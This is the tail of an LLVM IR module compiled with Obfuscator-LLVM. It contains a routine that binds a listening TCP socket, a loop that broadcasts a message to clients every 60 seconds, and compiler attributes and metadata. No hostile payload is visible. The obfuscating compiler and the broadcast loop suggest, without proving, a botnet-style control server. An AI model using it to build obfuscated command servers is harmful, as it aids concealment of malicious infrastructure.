  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i64 0, i64 0))
  %69 = call i32 @sleep(i32 60) #10
  br label %68
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @create_and_bind(i8*) unnamed_addr #0 {
  %2 = alloca %struct.addrinfo, align 8
  %3 = alloca %struct.addrinfo*, align 8
  %4 = alloca i32, align 4
  %5 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 2
  %6 = bitcast %struct.addrinfo* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 48, i32 8, i1 false)
  store i32 1, i32* %5, align 8
  %7 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 0
  store i32 1, i32* %7, align 8
  %8 = call i32 @getaddrinfo(i8* null, i8* %0, %struct.addrinfo* nonnull %2, %struct.addrinfo** nonnull %3) #10
  %9 = icmp eq i32 %8, 0
  br i1 %9, label %.preheader, label %12

.preheader:                                       ; preds = %1
  %.01719 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  %10 = icmp eq %struct.addrinfo* %.01719, null
  br i1 %10, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %11 = bitcast i32* %4 to i8*
  br label %16

; <label>:12:                                     ; preds = %1
  %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %14 = call i8* @gai_strerror(i32 %8) #10
  %15 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i64 0, i64 0), i8* %14) #12
  br label %45

; <label>:16:                                     ; preds = %.lr.ph, %38
  %.01720 = phi %struct.addrinfo* [ %.01719, %.lr.ph ], [ %.017, %38 ]
  %17 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 1
  %18 = load i32, i32* %17, align 4
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 2
  %20 = load i32, i32* %19, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 3
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @socket(i32 %18, i32 %20, i32 %22) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %38, label %25

; <label>:25:                                     ; preds = %16
  store i32 1, i32* %4, align 4
  %26 = call i32 @setsockopt(i32 %23, i32 1, i32 2, i8* nonnull %11, i32 4) #10
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i64 0, i64 0)) #12
  br label %29

; <label>:29:                                     ; preds = %28, %25
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 5
  %31 = load %struct.sockaddr*, %struct.sockaddr** %30, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 4
  %33 = load i32, i32* %32, align 8
  %34 = call i32 @bind(i32 %23, %struct.sockaddr* %31, i32 %33) #10
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %43, label %36

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %23) #10
  br label %38

; <label>:38:                                     ; preds = %16, %36
  %39 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 7
  %.017 = load %struct.addrinfo*, %struct.addrinfo** %39, align 8
  %40 = icmp eq %struct.addrinfo* %.017, null
  br i1 %40, label %._crit_edge.loopexit, label %16

._crit_edge.loopexit:                             ; preds = %38
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %42 = call i64 @fwrite(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i64 0, i64 0), i64 15, i64 1, %struct._IO_FILE* %41) #12
  br label %45

; <label>:43:                                     ; preds = %29
  %44 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  call void @freeaddrinfo(%struct.addrinfo* %44) #10
  br label %45

; <label>:45:                                     ; preds = %43, %._crit_edge, %12
  %.018 = phi i32 [ -1, %12 ], [ -1, %._crit_edge ], [ %23, %43 ]
  ret i32 %.018
}

; Function Attrs: noreturn nounwind
declare void @abort() local_unnamed_addr #8

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) local_unnamed_addr #4

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) local_unnamed_addr #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #9

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #9

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #10

; Function Attrs: nounwind
declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) #10

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { cold }
attributes #13 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{!2}
!2 = distinct !{!2, !3}
!3 = distinct !{!3, !"LVerDomain"}
!4 = !{!5}
!5 = distinct !{!5, !3}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.unroll.disable"}
!8 = distinct !{!8, !9, !10}
!9 = !{!"llvm.loop.vectorize.width", i32 1}
!10 = !{!"llvm.loop.interleave.count", i32 1}
!11 = distinct !{!11, !9, !10}
!12 = distinct !{!12, !9, !10}
